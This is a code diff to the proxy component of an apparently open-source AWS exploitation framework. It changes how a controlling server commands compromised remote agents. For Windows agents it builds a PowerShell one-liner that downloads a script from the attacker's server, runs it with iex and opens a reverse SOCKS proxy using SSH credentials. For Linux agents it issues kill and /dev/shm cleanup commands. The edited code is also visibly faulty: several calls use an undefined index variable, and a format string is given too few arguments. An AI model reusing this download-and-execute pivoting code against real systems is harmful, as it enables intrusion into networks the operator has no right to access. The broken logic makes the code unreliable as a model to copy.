@@ -449,7 +449,7 @@ class Main:
                     else:
                         return None, None, False
                 else:
-                    return ssh_username, ssh_password
+                    return ssh_username, ssh_password, False
             except Exception as error:
                 self.print('Failed to find a valid SSH user. Here is the output from the command "id -u {}": {}\n'.format(ssh_username, user_id))
                 new_user = self.input('An SSH user on the PacuProxy server is required to create a valid socks proxy routing through the remote agent. The user will be created with a random 25 character password and a /bin/false shell. Do you want to generate that user now? (y/n) ')
@@ -593,12 +593,14 @@ class Main:
     def parse_proxy_command(self, command):
         proxy_settings = self.get_proxy_settings()
 
+        shm_name = proxy_settings.ssh_shm_name
         proxy_ip = proxy_settings.ip
         proxy_port = proxy_settings.port
         proxy_listening = proxy_settings.listening
         proxy_ssh_username = proxy_settings.ssh_username
         proxy_ssh_password = proxy_settings.ssh_password
         proxy_target_agent = copy.deepcopy(proxy_settings.target_agent)
+        
 
         if len(command) == 1 or (len(command) == 2 and command[1] == 'help'):  # Display proxy help
             self.display_proxy_help()
@@ -639,6 +641,15 @@ class Main:
             if proxy_listening is False:
                 print('There does not seem to be a listener running currently.')
             else:
+                if not proxy_target_agent == []:
+                    if proxy_target_agent[-1].startswith('Windows'):
+                        pass
+                    #    for i, conn in enumerate(self.server.all_connections):
+                    #        if self.server.all_addresses[i][0] == proxy_target_agent[0]:
+                    #            self.server.run_cmd(proxy_target_agent[0], self.server.all_connections[i], 'Stop-PortForwardJobs')
+                    #            break
+                    else:
+                        self.server.run_cmd(proxy_target_agent[0], self.server.all_connections[i], 'kill -9 $! && rm /dev/shm/{}'.format(shm_name))
                 self.server.quit_gracefully()
                 self.queue.put(5)
                 self.server = None
@@ -661,15 +672,19 @@ class Main:
         elif command[1] == 'use':
             if len(command) == 3:
                 try:
-                    proxy_target_agent = self.server.all_addresses[int(command[2])]
                     if command[2] == 'none':
                         self.print('** No longer using a remote PacuProxy agent to route commands. **')
                         if proxy_target_agent[-1].startswith('Windows'):
-                            self.server.run_cmd(proxy_target_agent[0], self.server.all_connections[int(command[2])], 'Stop-PortForwardJobs')
+                            pass
+                        #    for i, conn in enumerate(self.server.all_connections):
+                        #        if self.server.all_addresses[i][0] == proxy_target_agent[0]:
+                        #            self.server.run_cmd(proxy_target_agent[0], self.server.all_connections[i], 'powershell Stop-PortForwardJobs')
+                        #            break
                         else:
-                            self.server.run_cmd(proxy_target_agent[0], self.server.all_connections[int(command[2])], 'kill -9 $! && rm /dev/shm/{}'.format(proxy_settings.ssh_shm_name))
+                            self.server.run_cmd(proxy_target_agent[0], self.server.all_connections[i], 'kill -9 $! && rm /dev/shm/{}'.format(shm_name))
                         proxy_target_agent = []
                     else:
+                        proxy_target_agent = self.server.all_addresses[int(command[2])]
                         if platform.system() == 'Windows':
                             self.print('** Windows hosts do not currently support module proxying. Run the PacuProxy server on a Linux host for full module proxying capability. **')
                             return
@@ -707,6 +722,8 @@ class Main:
                         self.print('Telling remote agent to connect back...')
 
                         if proxy_target_agent[-1].startswith('Windows'):
+                            self.print('Windows hosts not supported yet (coming soon!)')
+                            return
                             secret_string = ''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase + string.digits, k=25))
 
                             class S(BaseHTTPRequestHandler):
@@ -748,18 +765,19 @@ class Main:
                             # 4. Kill HTTP server
 
                             # Download the script from the PacuProxy server
-                            downloaded_string = '(New-Object System.Net.WebClient).DownloadString("http://{}:{}/{}")'.format(proxy_ip, pproxy_port, secret_string)
+                            downloaded_string = '(New-Object System.Net.WebClient).DownloadString(\'http://{}:{}/{}\')'.format(proxy_ip, proxy_port, secret_string)
                             
                             # Run Invoke-Expression on the downloaded script to import it to memory
-                            invoke_expression = 'iex({})'.format(downloaded_string)
+                            invoke_expression = 'powershell iex({})'.format(downloaded_string)
                             
                             # Execute the newly imported script to start the reverse proxy
-                            start_proxy_cmd = 'Start-SocksProxy -sshhost {} -username {} -password {} -RemotePort 8001 -LocalPort 5050'.format(proxy_ip, proxy_ssh_username, proxy_ssh_password)
+                            start_proxy_cmd = 'powershell Start-SocksProxy -sshhost {} -username {} -password {} -RemotePort 8001 -LocalPort 5050'.format(proxy_ip, proxy_ssh_username, proxy_ssh_password)
 
                             # Combine the commands into a one-liner
                             connect_back_cmd = '{}; {}'.format(invoke_expression, start_proxy_cmd)
                         else:
-                            shm_name = ''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase + string.digits, k=5))
+                            if shm_name == '':
+                                shm_name = ''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase + string.digits, k=5))
                             
                             # Create an in-memory file in /dev/shm that contains the password
                             create_shm = 'echo "echo {}" > /dev/shm/{}'.format(shm_name)
